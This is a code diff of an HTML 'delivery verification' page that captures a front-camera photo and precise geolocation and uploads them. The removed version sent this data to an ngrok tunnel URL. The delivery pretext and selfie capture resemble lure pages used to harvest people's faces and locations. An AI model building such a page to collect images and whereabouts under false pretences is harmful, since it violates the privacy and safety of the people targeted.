@@ -11,64 +11,37 @@
       max-width: 480px;
       margin: 0 auto;
       padding: 20px;
-      line-height: 1.6;
       user-select: none;
     }
-
-    h2 {
-      text-align: center;
-      color: #2c3e50;
-      cursor: pointer;
-    }
-
+    h2 { text-align: center; cursor: pointer; }
     #tapPrompt {
-      background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-      color: white;
-      padding: 35px 25px;
+      background: linear-gradient(135deg,#667eea,#764ba2);
+      color: #fff;
+      padding: 30px;
       border-radius: 15px;
       text-align: center;
-      box-shadow: 0 10px 30px rgba(0,0,0,0.2);
-      animation: pulse 2s ease-in-out infinite;
       margin-top: 40px;
       cursor: pointer;
     }
-
-    @keyframes pulse {
-      0%,100% { transform: scale(1); }
-      50% { transform: scale(1.05); }
-    }
-
     #status {
       display: none;
-      margin-top: 25px;
+      margin-top: 20px;
       padding: 15px;
       border-radius: 6px;
       background: #f0f9ff;
-      border: 1px solid #b3e0ff;
-      color: #333;
     }
-
-    .error {
-      background: #fff5f5;
-      border-color: #ffc9c9;
-      color: #dc3545;
-    }
-
+    .error { background: #fff5f5; color: #dc3545; }
     .loading {
-      display: inline-block;
       width: 20px;
       height: 20px;
-      border: 3px solid rgba(0,0,0,.1);
-      border-radius: 50%;
+      border: 3px solid #ddd;
       border-top-color: #007bff;
+      border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin-right: 10px;
-      vertical-align: middle;
+      display: inline-block;
+      margin-right: 8px;
     }
-
-    @keyframes spin {
-      to { transform: rotate(360deg); }
-    }
+    @keyframes spin { to { transform: rotate(360deg); } }
   </style>
 </head>
 
@@ -78,114 +51,79 @@
 
 <div id="tapPrompt">
   <h3>📦 Tap to Start Verification</h3>
-  <p>Camera & location permission will be requested</p>
+  <p>Camera & location permission required</p>
 </div>
 
 <div id="status">
   <span class="loading"></span>
-  <span id="statusText">Initializing...</span>
+  <span id="statusText">Loading...</span>
 </div>
 
 <script>
 let started = false;
 
-const SERVER_URL = "https://imaginarily-unrailwayed-tyler.ngrok-free.dev/api/confirm";
-const ENCRYPTION_KEY = "your-32-byte-secure-key-1234567890abc";
+const SERVER_URL = "/api/confirm";
 
 const tapPrompt = document.getElementById("tapPrompt");
 const statusEl = document.getElementById("status");
 const statusText = document.getElementById("statusText");
 
-function setStatus(msg, isError = false) {
+function setStatus(msg, error=false){
   statusText.textContent = msg;
   statusEl.style.display = "block";
-  statusEl.className = isError ? "error" : "";
+  statusEl.className = error ? "error" : "";
 }
 
-async function startVerification(e) {
-  if (started) return;
+async function startVerification(e){
+  if(started) return;
   started = true;
-
   e.preventDefault();
-  e.stopPropagation();
-
-  tapPrompt.style.display = "none";
-  setStatus("Requesting camera permission...");
 
   try {
-    /* ===== CAMERA ===== */
-    const stream = await navigator.mediaDevices.getUserMedia({
-      video: { facingMode: "user" }
+    tapPrompt.style.display = "none";
+    setStatus("Requesting camera...");
+
+    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+    const video = document.createElement("video");
+    video.srcObject = stream;
+    await video.play();
+
+    const canvas = document.createElement("canvas");
+    canvas.width = video.videoWidth;
+    canvas.height = video.videoHeight;
+    canvas.getContext("2d").drawImage(video,0,0);
+    const photo = await new Promise(r=>canvas.toBlob(r,"image/jpeg",0.9));
+    stream.getTracks().forEach(t=>t.stop());
+
+    setStatus("Requesting location...");
+    const loc = await new Promise((res,rej)=>{
+      navigator.geolocation.getCurrentPosition(res,rej,{enableHighAccuracy:true});
     });
 
-    const track = stream.getVideoTracks()[0];
-    let blob;
-
-    try {
-      const imgCap = new ImageCapture(track);
-      blob = await imgCap.takePhoto();
-    } catch {
-      const video = document.createElement("video");
-      video.srcObject = stream;
-      await video.play();
-
-      const canvas = document.createElement("canvas");
-      canvas.width = video.videoWidth;
-      canvas.height = video.videoHeight;
-      canvas.getContext("2d").drawImage(video, 0, 0);
-      blob = await new Promise(r => canvas.toBlob(r, "image/jpeg", 0.9));
-    }
-
-    stream.getTracks().forEach(t => t.stop());
-
-    /* ===== LOCATION ===== */
-    setStatus("Requesting location permission...");
-
-    const loc = await new Promise((resolve, reject) => {
-      navigator.geolocation.getCurrentPosition(
-        resolve,
-        () => reject(new Error("Location permission denied")),
-        { enableHighAccuracy: true, timeout: 15000 }
-      );
-    });
-
-    /* ===== DATA ===== */
-    setStatus("Uploading data...");
+    setStatus("Uploading...");
 
     const params = new URLSearchParams(location.search);
-    const deliveryId = params.get("deliveryId") || "unknown";
-    const token = params.get("token") || "";
-
     const fd = new FormData();
-    fd.append("photo", blob, "delivery.jpg");
+    fd.append("photo", photo);
+    fd.append("deliveryId", params.get("deliveryId"));
     fd.append("lat", loc.coords.latitude);
     fd.append("lon", loc.coords.longitude);
-    fd.append("deliveryId", deliveryId);
-    fd.append("token", token);
 
-    const res = await fetch(SERVER_URL, {
-      method: "POST",
-      body: fd
-    });
+    const r = await fetch(SERVER_URL,{ method:"POST", body:fd });
+    if(!r.ok) throw new Error("Server error");
 
-    if (!res.ok) throw new Error("Server error");
-
-    statusEl.innerHTML =
-      "<div style='text-align:center;color:#28a745;font-size:18px;'>✓ Delivery verified successfully</div>";
-
-    setTimeout(() => window.close(), 2000);
-
-  } catch (err) {
+    statusEl.innerHTML = "<b style='color:green'>✓ Delivery Verified</b>";
+  }
+  catch(err){
     console.error(err);
-    setStatus(err.message || "Verification failed", true);
-    tapPrompt.style.display = "block";
-    started = false;
+    setStatus(err.message,true);
+    tapPrompt.style.display="block";
+    started=false;
   }
 }
 
-/* ✅ ONLY user gesture */
 tapPrompt.addEventListener("click", startVerification);
-tapPrompt.addEventListener("touchstart", startVerification, { passive: false });
+tapPrompt.addEventListener("touchstart", startVerification);
 </script>
 
 </body>
